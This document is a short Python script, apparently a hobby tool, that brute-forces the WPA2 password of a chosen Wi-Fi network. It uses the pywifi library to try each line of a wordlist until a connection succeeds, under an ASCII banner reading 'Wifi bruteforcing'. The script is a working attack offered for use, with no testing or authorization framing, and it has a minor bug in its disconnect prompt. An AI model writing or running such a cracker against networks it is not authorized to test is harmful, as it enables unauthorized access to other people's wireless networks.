import termcolor2
import colorama
colorama.init()




myText = '''

██░▀██████████████▀░██          
█▌▒▒░████████████░▒▒▐█              #     #  #  # ##    Luɲɑ
█░▒▒▒░██████████░▒▒▒░█              #     #  #  ##  #   #  #
▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐              #     #  #  #    #  ####
░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░              #     #  #  #    #  #  #
███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██            ####   ##   #    #  #  #
██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█                       # 
▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌                     ##
█░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█                
▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒                 Wɪғɪ ʙʀᴜᴛᴇғᴏʀᴄɪɴɢ 
░░░░░░░░░░└┴┘░░░░░░░░░                
██▄▄░░░░░░░░░░░░░░▄▄██               
████████▒▒▒▒▒▒████████               
█▀░░███▒▒░░▒░░▒▀██████
█▒░███▒▒╖░░╥░░╓▒▐█████
█▒░▀▀▀░░║░░║░░║░░█████
██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███
██████████████████████
'''

# a definiir com com paloma 
print(termcolor2.colored(myText, 'yellow'))


import pywifi
import time
from pywifi import const

wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

if iface.status() == const.IFACE_CONNECTED:
    print('=> There is already a network connected')
    choose = input('''=> Disconnect and continue or give up?
                        (type disk to disconnect or gu for give up)\n''')
    if choose == 'disconnect':
        iface.disconnect()
        print('=> disconnected')
        time.sleep(2)
    elif choose == 'gu':
        print('=> okay, bye')
        time.sleep(2)
        exit()


assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

profile = pywifi.Profile()
ssid = input('{+} SSID: ')
profile.ssid = ssid
profile.auth = const.AUTH_ALG_OPEN
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.cipher = const.CIPHER_TYPE_CCMP

ssid = input('{+} wordlist(.txt): ')
f = open(ssid,'r')
arq = f.readlines()
lines = len(arq)


i=0
for tentativa in arq:
        lista = tentativa.rstrip('\n')
        print('Attemp',i,':',lista)
        i+=1
        profile.key = lista
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(5)
        if iface.status() == const.IFACE_CONNECTED:
            print('connected')
            print('''
                            have a nice day :3
                ''')
            #iface.disconnect()
            time.sleep(1)
            exit()
f.close()




